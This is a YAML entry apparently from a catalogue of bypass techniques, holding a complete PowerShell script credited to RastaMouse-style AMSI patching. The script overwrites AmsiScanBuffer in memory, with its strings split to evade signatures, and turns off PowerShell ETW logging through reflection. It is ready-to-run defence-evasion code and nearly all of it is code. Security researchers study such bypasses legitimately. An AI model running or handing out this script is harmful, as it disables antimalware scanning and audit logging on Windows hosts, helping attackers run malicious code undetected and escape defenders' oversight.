name: y0k4i
authors:
  - '@yok4i'
description: |
  RastaMouse and ETW bypasses
comments:
  - https://rastamouse.me/memory-patching-amsi-bypass/
  - https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32
language: powershell
min_language_version: '3'
script: |
  $Win32 = @"
  using System;
  using System.Runtime.InteropServices;
  public class Win32 {
      [DllImport("kernel32")]
      public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

      [DllImport("kernel32")]
      public static extern IntPtr LoadLibrary(string name);

      [DllImport("kernel32")]
      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

  }
  "@
  Add-Type $Win32
  $LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
  $Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
  $p = 0
  [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
  $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
  [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
  [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled', 'NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider', 'NonPublic,Static').GetValue($null), 0);